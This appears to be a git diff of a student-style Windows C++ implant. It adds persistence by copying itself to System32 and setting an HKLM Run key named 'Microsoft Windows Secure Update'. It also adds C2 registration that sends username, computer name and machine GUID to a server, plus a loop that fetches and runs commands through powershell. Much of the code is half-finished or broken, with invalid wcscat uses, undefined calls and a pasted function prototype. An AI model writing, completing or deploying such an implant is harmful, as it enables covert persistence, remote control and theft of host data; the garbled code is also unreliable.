@@ -14,42 +14,200 @@
 
 #include <ws2tcpip.h>
 
+#include <fileapi.h> //for chonkycheck()
+
+//For Persistence--------------------------------------------------------
+/* *Credit*
+https://github.com/CoolerVoid/X_files/blob/master/src/automatically_run_proc_startup.cpp 
+*/
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <windows.h>
+#include <stdio.h>
+#include <memory>
+
+// run at 32bit and 64bit
+#define KEY_WOW64_32KEY 0x0200
+#define KEY_WOW64_64KEY 0x0100
+#if defined(_WIN64)
+ #define CROSS_ACCESS KEY_WOW64_32KEY
+#else
+ #define CROSS_ACCESS KEY_WOW64_64KEY
+#endif
+//For Persistence---------------------------------------------------------------
+
+
+
+//For hex converter
+#include <stdexcept>
+#include <sstream>
+#include <iomanip>
+#include <string>
+#include <cstdint>
+//For hex converter
+
+//#include <info.h>
+
+
+
+//Chonkycheck
+bool chonkyCheck(){
+    bool isChonkyPresent = false;
+    wchar_t *fileName = L"C:\\malware\\ch0nky.txt"; //Check if this is the right way to include file: is it just chonky.txt or whole path??
+    DWORD result = GetFileAttributesW(fileName);
+    if(result != INVALID_FILE_ATTRIBUTES){
+        //File is there
+        isChonkyPresent = true;
+        return isChonkyPresent;
+    }
+    //file is not there
+    return isChonkyPresent; 
+}
+
+
+
 
 //DLL stealer
 
 
-//gather info (Situational Awareness) 
-	//Need way to connect to machine??
-//GetHostAddress();  Might not need this
+//----------------------------------------------------------------------Persistence---------------------------------------------------------------------------//
+int persistentdll(){
+    // copy program implant.dll to system32 directory
+    wchar_t system2[MAX_PATH];
+    wchar_t pathtofile[MAX_PATH];
+    HMODULE ModPath = GetModuleHandle(NULL);
+    GetModuleFileName(ModPath,pathtofile,sizeof(pathtofile));
+    GetSystemDirectory(system2,sizeof(system2));
+    wcscat(system2,L"\\implant.dll"); // program name at second argv
+    CopyFile(pathtofile,system2,false);
 
-//Computer IP address??
-//https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getipaddrtable
-/*wchar_t *myIPAddress(){
-//IPHLPAPI_DLL_LINKAGE 
-ULONG dwSize = 0;
-PMIB_IPADDRTABLE pIpAddrTable;
+    // write registry entries
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE | CROSS_ACCESS,&hKey );
+    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx
+    RegSetValueEx(hKey, L"Microsoft Windows Secure Update",0,REG_SZ,(const unsigned char*)system2,sizeof(system2));
+    RegCloseKey(hKey);
 
-pIpAddrTable = (MIB_IPADDRTABLE *) malloc(sizeof (MIB_IPADDRTABLE));
-//Calculate size
-DWORD bufferSuccess = GetIpAddrTable(pIpAddrTable, &dwSize, 0);
-if(bufferSuccess == ERROR_INSUFFICIENT_BUFFER) {
-    free(pIpAddrTable);
-	std::wcout << L"Buffer error " << GetLastError() << std::endl;
-    pIpAddrTable = (MIB_IPADDRTABLE *) malloc(dwSize);
+	return EXIT_SUCCESS;
 }
-//Call again for data
-DWORD dataSuccess = GetIpAddrTable(pIpAddrTable, &dwSize, 0);
-if(dataSuccess != NO_ERROR){
-	std::wcout << L"Data error " << GetLastError() << std::endl;
-	return L"FAIL";
+//---------------------------------------------------------------------Persistence---------------------------------------------------------------------------//
+
+
+
+
+//-------------------------------------------------------------------C2 Communication Functions---------------------------------------------------------------//
+
+wchar_t *server = L"http://127.0.0.1:8050"; 
+wchar_t *register_path = L"/register";
+wchar_t *checkin_path = wcscat( L"/checkin/", GetMachineGuid()); //concat with implant_id
+
+//Convert from string to hex
+//https://stackoverflow.com/questions/3381614/c-convert-string-to-hexadecimal-and-vice-versa
+std::wstring string_to_hex(const std::wstring &in) {
+    std::wstringstream ss;
+
+    ss << std::hex << std::setfill('0');
+    for (size_t i = 0; in.length() > i; ++i) {
+        ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
+    }
+
+    return ss.str(); 
 }
-std::wcout << L"Success2" << std::endl;
-std::wcout << L"IP addresses " << pIpAddrTable << std::endl;
-return L"Success for now";
 
-} */
 
-//Root privileges?
+//get cmd
+wchar_t *getCMD(){
+	wchar_t* CMD;
+	wchar_t* result = makeHttpCMDRequest(server, 443, checkin_path, 1, NULL); //NULL == optional data to send to post request
+	if(result != NULL){
+		CMD = result.parse(); //MAKE PARSE FUNCTION
+	}
+	return CMD;
+}
+
+//Run cmd
+wchar_t *runCMD(wchar_t*CMD){
+	wchar_t*output;
+	if(CMD ==NULL){
+		return output;
+	}
+	BOOL h = CreateProcessW();
+	if(!h){
+		return output;
+	}
+	myPipe = CreateNamedPipeW(h);
+	result = pOpen(myPipe, powershell, CMD, output = read(myPipe));
+	output = result.read();
+	return output;
+}
+BOOL CreateProcessW(
+  [in, optional]      LPCWSTR               lpApplicationName,
+  [in, out, optional] LPWSTR                lpCommandLine,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  [in]                BOOL                  bInheritHandles,
+  [in]                DWORD                 dwCreationFlags,
+  [in, optional]      LPVOID                lpEnvironment,
+  [in, optional]      LPCWSTR               lpCurrentDirectory,
+  [in]                LPSTARTUPINFOW        lpStartupInfo,
+  [out]               LPPROCESS_INFORMATION lpProcessInformation
+);
+
+//Create Process
+BOOL processSuccess = CreateProcessW(NULL, NULL, NULL, NULL, );
+//CreatePipe to run powershell.exe c/ cmds
+//read results from pipe
+
+//sendResponse(data from runtasks)
+void sendData(wchar_t*output){
+	if(Data !=NULL){
+		Data = hex(output);
+		POST(server, 443, checkin_path, 1, Data);
+	}
+	return;
+}
+
+//register()
+/*
+implant_id = os.urandom(10).hex()
+    whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
+    output += result.stdout.read().decode()
+    r = requests.post(f"{server}{reigster_path}", json={"implant_id":implant_id, "whoami":whoami})
+    if r.status_code ==200:
+        if r.text == "OK":
+            print("reigstered!")
+            return True 
+        
+    return False 
+	*/
+
+bool registerImplant(){
+	//Victim/implant info
+	wchar_t *implant_id = wcscat(L"guid=", GetMachineGuid());
+	wchar_t *implant_username = wcscat(L"&username=", myGetUserName());
+	wchar_t *implant_computername = wcscat(L"&computername=", myGetComputerName());
+
+	wchar_t *payload1 = wcscat(implant_id, implant_username);
+	wchar_t *payload2 = wcscat(payload1, implant_computername);
+
+	std::wstring hexpayload = string_to_hex(payload2);
+	//post to concat server + registerpath, put into json ?? (implant_id, whoami)
+
+
+	
+	
+
+	return false;
+}
+
+//-------------------------------------------------------------------C2 Communication Functions---------------------------------------------------------------//
+
+
+
+
+//----------------------------------------------------------Situational Awareness-------------------------------------------------------------------------------//
+//Root privileges
 //https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
 wchar_t *checkPrivileges(){
 	//Check if admin
@@ -62,14 +220,13 @@ wchar_t *checkPrivileges(){
 		if(!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin )){
 			isAdmin = FALSE;
 			FreeSid(AdministratorsGroup);
-			//std::wcout << L"NOT admin group" << std::endl;
+            //Not Admin privileges
 			wchar_t *privilegeGroup = L"NotAdmin";
 			return  privilegeGroup;
 		}
 		FreeSid(AdministratorsGroup);
 	}
 	wchar_t *privilegeGroup = L"Admin";
-	//std::wcout << L"Is Admin group? " << privilegeGroup<< std::endl;
 	return  privilegeGroup;
 }
 
@@ -79,15 +236,11 @@ wchar_t *myGetComputerName(){
 	DWORD BufferSize = MAX_COMPUTERNAME_LENGTH*sizeof(wchar_t) + 1;
 	long compNameSuccess = GetComputerNameW(compNameBuffer, &BufferSize);
 	if(compNameSuccess == 0){
-		//std::wcout << L"Computer Name FAILED" << std::endl;
-		//std::wcout << L"BufferSize is: " << BufferSize << std::endl;
-		//std::wcout << L"Computer Name is" << compNameBuffer << std::endl;
+        //Fail
 		wchar_t *FAIL = L"FAIL";
 		return FAIL;
 	}
 	else {
-		//std::wcout << L"SUCCESS!" <<std::endl;
-		//std::wcout << L"The Computer Name is " << compNameBuffer << std::endl;
 		return compNameBuffer; 
 	}
 }
@@ -101,14 +254,13 @@ wchar_t *GetMachineGuid (){
 	//use regopen first
 	long regOpenSuccess = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hkey);
 	if(regOpenSuccess != ERROR_SUCCESS){
-		//std::wcout << L"Reg open FAILED " << GetLastError() << std::endl;
+        //fail
 		wchar_t *FAIL = L"FAIL";
 		return FAIL;
 	}
 	//RegGetValueW
 	long guidSuccess = RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid", RRF_RT_REG_SZ, NULL, guidBuffer, (LPDWORD) &Buffersize);
 	if (guidSuccess!= 0){ 
-		//std::wcout << L"MACHINE GUID FAILED " << GetLastError() << std::endl;
 		wchar_t *FAIL = L"FAIL"; 
 
 		//RegCloseKey	
@@ -116,8 +268,6 @@ wchar_t *GetMachineGuid (){
 		return FAIL;
 	}
 	else {
-		//std::wcout << L"SUCCESS!" <<std::endl;
-		//std::wcout << L"The Machine Guid is " << guidBuffer << std::endl;
 		return guidBuffer; 
 	}
 	//RegCloseKey	
@@ -130,49 +280,54 @@ wchar_t *myGetUserName(){
 	DWORD BufferSize = sizeof(userNameBuffer);
 	long UNSuccess = GetUserNameW(userNameBuffer, &BufferSize);
 	if (UNSuccess == 0){
-			//std::wcout << L"CURRENT USERNAME FAILED" << std::endl;
-			wchar_t *FAIL = L"FAIL";
+		//fail
+        wchar_t *FAIL = L"FAIL";
 		return FAIL;  
 	}
 	else {
-		//std::wcout << L"SUCCESS!" <<std::endl;
-		//std::wcout << L"The current username is " << userNameBuffer << std::endl;
 		return userNameBuffer; 
 	}
 }
 
 
-struct _victimInfo{
-	wchar_t *username = myGetUserName();
-	wchar_t *machineGUID = GetMachineGuid();
-	wchar_t *computerName = myGetComputerName();
-	DWORD currentProcessID = GetCurrentProcessId();
-	wchar_t *isAdmin = checkPrivileges();
-	
-	//TO ADD:
-	//Ip address
-} victimInfo;
+//----------------------------------------------------------Situational Awareness-------------------------------------------------------------------------------//
+
+
+
+
 
 
 int wmain(int argc, wchar_t* argv[]){
 
-    //call functions
-    //myGetUserName(); //works!
-    //GetMachineGuid(); //works!
-    //myGetComputerName(); //works!
-    checkPrivileges(); //works!
-	//myIPAddress(); //ISSUES
+    //First thing to do is check if Ch0nky file is there: if not--> exit program and don't inject, else--> continue
+    bool chonkyPresence = chonkyCheck();
+    if(chonkyPresence == false){ //Not sure if this would stop the reflective loader !!!
+        //do nothing
+        return 0;
+    }
+	//Call persistence
+	persistentdll();
 
-	//CurrentProcessID
-	//DWORD currentProcessID = GetCurrentProcessId(); //works!
-	//std::wcout << L"Current Process ID is " << currentProcessID << std::endl;
-	victimInfo; 
-	
-	std::wcout << L"Username: " << victimInfo.username << std::endl;
-	std::wcout << L"Machine GUID: " << victimInfo.machineGUID << std::endl;
-	std::wcout << L"Computer Name: " << victimInfo.computerName << std::endl;
-	std::wcout << L"Process ID: " << victimInfo.currentProcessID << std::endl;
-	std::wcout << L"Is Admin: " << victimInfo.isAdmin << std::endl;
+   //Register function
+   //loop to get and send tasks
+   while(!registerImplant()){
+	   Sleep(1000);
+   }
+   while(true){
+
+	   wchar_t *newCMD = getCMD();
+	   if(newCMD != NULL){
+		   wchar_t *output = runCMD(newCMD);
+		   sendData(output);
+	   }
+   }
+
+    
+    
+
+    
+
+
 	return 0;
     
 }
